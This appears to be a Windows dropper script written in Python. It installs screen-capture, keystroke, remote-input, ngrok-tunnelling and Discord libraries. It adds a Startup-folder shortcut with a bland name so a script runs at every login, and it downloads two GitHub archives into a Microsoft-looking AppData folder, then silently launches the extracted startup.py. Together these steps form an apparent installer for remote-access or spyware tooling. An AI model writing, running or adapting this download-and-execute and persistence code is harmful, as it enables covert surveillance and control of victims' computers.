import os
import subprocess
import sys
import time
import zipfile
from pathlib import Path

required_packages = [
    'flask', 'flask-socketio', 'opencv-python-headless', 'numpy', 'mss',
    'pyngrok', 'pyautogui', 'Pillow', 'nextcord', 'requests',
    'keyboard', 'python-dateutil', 'pywin32'
]

def install_packages():
    try:
        for package in required_packages:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
        print("All packages installed successfully!")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install {e.cmd}. Error: {e}")

install_packages()

time.sleep(3)

import requests
import win32com.client

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
os.makedirs(target_path, exist_ok=True)

def add_to_startup(script_path=os.path.join(target_path, 'skibid-startup', 'startup.py'), shortcut_name="MyPythonScript"):

    if script_path is None:
        script_path = sys.argv[0]

    startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"

    startup_dir.mkdir(parents=True, exist_ok=True)


    shortcut_path = startup_dir / f"{shortcut_name}.lnk"

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(str(shortcut_path))
    shortcut.TargetPath = sys.executable
    shortcut.Arguments = f'"{script_path}"'
    shortcut.WorkingDirectory = str(Path(script_path).parent)
    shortcut.IconLocation = str(script_path)
    shortcut.save()

    print(f"Shortcut created at {shortcut_path}")

add_to_startup()

r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
open(file_path, 'wb').write(r.content)
with zipfile.ZipFile(file_path, 'r') as zip_ref:
    zip_ref.extractall(target_path)
os.remove(file_path)

r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/startup.zip", allow_redirects=True)
file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-startup.zip')
open(file_path, 'wb').write(r.content)
with zipfile.ZipFile(file_path, 'r') as zip_ref:
    zip_ref.extractall(target_path)
os.remove(file_path)

subprocess.Popen(["python", os.path.join(target_path, "skibidi-startup", "startup.py")])